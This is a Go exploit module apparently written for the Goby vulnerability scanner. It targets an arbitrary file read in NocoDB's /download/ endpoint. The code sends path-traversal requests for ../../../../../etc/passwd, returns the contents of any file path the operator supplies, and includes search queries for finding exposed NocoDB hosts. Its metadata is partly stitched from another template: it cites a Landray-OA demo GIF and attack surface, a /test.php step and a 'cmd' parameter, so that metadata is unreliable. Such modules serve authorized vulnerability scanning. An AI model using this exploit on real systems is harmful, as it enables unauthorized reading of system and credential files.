package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
)

func init() {
	expJson := `{
    "Name": "NocoDB /download/ File Read Vulnerability",
    "Description": "<p>NocoDB has an arbitrary file read vulnerability, which can be exploited by attackers to read files on SiNocoDB for subsequent exploitation</p>",
    "Product": "NocoDB",
    "Homepage": "https://nocodb.com/",
    "DisclosureDate": "2023-06-08",
    "Author": "qxi",
    "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/Landray-OA/Landray_OA_custom_jsp_RCE.gif",
    "Level": "2",
    "Impact": "<p>NocoDB has an arbitrary file read vulnerability, which can be exploited by attackers to read files on SiNocoDB for subsequent exploitation</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "dir",
            "name": "path",
            "value": "../../../../../etc/passwd",
            "type": "input"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "../../../../../etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nuxt",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "8.6",
    "AttackSurfaces": {
        "Application": [
            "landray-OA"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Recommendation": "<p>Upgrade NocoDB version</p>",
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "Is0day": false,
    "VulType": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "NocoDB /download/ 文件读取漏洞",
            "Product": "NocoDB",
            "Description": "<p>NocoDB存在任意文件读取漏洞，攻击者可以利用该漏洞读取NocoDB上文件，进行后续利用。</p>",
            "Recommendation": "<p>升级NocoDB版本</p>",
            "Impact": "<p>NocoDB存在任意文件读取漏洞，攻击者可以利用该漏洞读取NocoDB上文件，进行后续利用。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "NocoDB /download/ File Read Vulnerability",
            "Product": "NocoDB",
            "Description": "<p>NocoDB has an arbitrary file read vulnerability, which can be exploited by attackers to read files on SiNocoDB for subsequent exploitation<br></p>",
            "Recommendation": "<p>Upgrade NocoDB version<br></p>",
            "Impact": "<p>NocoDB has an arbitrary file read vulnerability, which can be exploited by attackers to read files on SiNocoDB for subsequent exploitation</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title==\"NocoDB\" || (body=\"href=\\\"./_nuxt/nocodb\" && body=\"<script>window.__NUXT__\")",
    "GobyQuery": "title==\"NocoDB\" || (body=\"href=\\\"./_nuxt/nocodb\" && body=\"<script>window.__NUXT__\")",
    "PostTime": "2024-04-29",
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10945"
}`

	doGetdoGet38dhudfbw9h := func(u *httpclient.FixUrl, path string) (*httpclient.HttpResponse, error) {
		encodePath := url.QueryEscape(path)
		cfg := httpclient.NewGetRequestConfig("/download/" + encodePath)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)
		return resp, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			path := "../../../../../etc/passwd"
			if resp, err := doGetdoGet38dhudfbw9h(u, path); err == nil && resp.StatusCode == 200 {
				ss.VulURL = u.FixedHostInfo + "/download/" + path
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			path := ss.Params["path"].(string)
			if resp, err := doGetdoGet38dhudfbw9h(expResult.HostInfo, path); err == nil {

				expResult.Output = resp.RawBody
				expResult.Success = true
				return expResult
			}

			return expResult
		},
	))
}
